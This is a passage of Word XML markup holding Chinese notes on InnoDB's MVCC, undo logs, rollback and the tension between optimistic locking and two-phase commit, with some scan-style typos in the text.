          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="subscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">； </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>操作对两者都不修改，只读相应的数据</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>对于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>MVCC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的总结</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>上述更新前建立</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>undo log,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>根据各种策略读取时非阻塞就是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>MVCC, undo log</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中的行就 是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>MVCC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中的多版本，这个可能与我们所坦解的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>MVCC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>有较大的出入，一般我们认为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">WCC </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>有下面几个特点：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>每行数据都存在一个版本，每次数据更新时都更新该版本</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>修改时</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Copy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>出当前版本随意修改，各个事务之间无干扰</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>保存时比较版本号，如果成功</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(commit)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:则覆盖原记录；失败则放弃</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">copy (rollback) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">就是每行都有版本号，保存时根据版本号决定是否成功，听起来含有乐观锁的味道，而 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Innodb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的实现方式是：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>事务以排他锁的形式修改原始数据</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>把修改前的数据存放于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>undo log,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>通过回滚指针与主数据关联</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>修改成功</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(commit)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>嗜都不做，失败则恢复</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>undo log</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中的数据</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(rollback)</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>二者最本质的区别是，当修改数据时是否要排他锁定，如果锁定了还算不算是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>MVCC?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Innodb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的实现真算不上</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>MVCC,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>因为并没有实现核心的多版本共存，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>undo log</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中的内容 只是串行化的结果，记录了多个事务的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>程，不属于多版本共存。但理想的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>MVCC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是难 以实现的，当事务仅修改一行记录使用理想的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>MVCC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>模式是没有问题的，可以通过比较 版本号进行回滚；但当事务影响到多行数据时，理想的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>MVCC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>据无能为力了。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>比如，如果</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Transacitonl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>执行理想的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>MVCC,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>修改</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Rowl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>成功，而修改</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Row2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>失败，此时 需要回滚</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Rowl,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>但因为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Rowl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>没有被锁定，其数据可能又被</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Tran</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="subscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>action2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>所修改，如 果此时回滚</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Rowl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的内容，则会破坏</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Transaction2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的修改结果，导致</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Transaction?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>违 反</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ACIDo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>理想</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>MVCC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>难以实现的根本原因在于企图通过乐观锁代替二段提交。修改两行数据，但 为了保证其一致性，与修改两个分布式系统中的数据并无区别，而二提交是目前这种场 景保证一致性的唯一手段。二段提交的本质是锁定，乐观锁的本质是消除锁定，二者矛 盾，故理想的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>MVCC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>难以真正在实际中被应用，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Innodb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">只是借了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>NVCC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>这个名字，提供 了读的非阻塞而已。</w:t>
      </w:r>
